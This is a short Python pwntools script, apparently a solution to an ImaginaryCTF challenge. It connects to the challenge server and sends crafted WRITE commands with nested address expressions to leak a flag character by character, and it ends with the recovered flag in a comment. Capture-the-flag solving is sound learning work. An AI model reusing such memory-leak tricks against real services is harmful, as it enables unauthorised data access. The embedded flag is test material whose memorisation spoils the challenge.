from pwn import *
from tqdm import tqdm

# io = process(["python", "main.py"])
io = remote("puzzler7.imaginaryctf.org", 1014)

def cmd(c: str):
    io.sendlineafter(b">>> ", c.encode())


for i in tqdm(range(128)):
    cmd(f"WRITE {i} {i}")

flag = ""
while True:
    i = len(flag)
    cmd(f"WRITE 0[{i}[2048]] 0")
    io.recvuntil(b"Wrote 0 to address ")
    v = int(io.recvuntilS(b" ")[:-1])
    flag += chr(v)
    cmd(f"WRITE {v} {v}")
    print(flag)
    if flag.endswith("}"):
        break
# ictf{sp000kygh0s+}
